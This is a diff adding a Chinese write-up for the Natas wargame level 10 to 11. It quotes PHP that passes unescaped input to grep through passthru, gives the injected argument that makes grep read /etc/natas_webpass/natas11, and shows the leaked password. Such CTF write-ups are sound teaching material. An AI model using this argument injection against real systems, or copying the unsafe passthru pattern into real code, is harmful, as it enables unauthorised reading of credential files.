@@ -375,9 +375,39 @@ D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
 
 ## Level 10 -> Level 11
 
+```php
+if($key != "") {
+    if(preg_match('/[;|&]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i $key dictionary.txt");
+    }
+}
+```
+
+有变化的只有这里，如页面所说，对输入进行了过滤，现在输入不能有这些：`;`, `|`, `&`  
+> 插播正则表达式小知识：  
+> 在这个例子中：`''`表示字符串，两个`/`是php正则表达式的分隔符，`[]`则是正则表达式的字符匹配，表示匹配里面的每一个字符(单独匹配，不会连起来  
+> 具体还是看这个吧[https://www.runoob.com/regexp/regexp-syntax.html](https://www.runoob.com/regexp/regexp-syntax.html)  
+
+**不过，说了那么多，其实这题解法很简单甚至不涉及上面的那些**  
+只要想起`grep`可以查找多个文件就行了，所以，加一个密码文件的路径不就行了嘛(￣▽￣)"  
+大概就像这样：`grep <匹配的模式> 文件1 文件2`  
+
+所以提交这个就行了↓  
+`'.' /etc/natas_webpass/natas11`  
+
+```
+Output:
+/etc/natas_webpass/natas11:1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
+dictionary.txt:African
+# 下面一大堆，略
+```
+
 ### 密码
 
 ```
+1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
 ```
 
 ## Level 11 -> Level 12
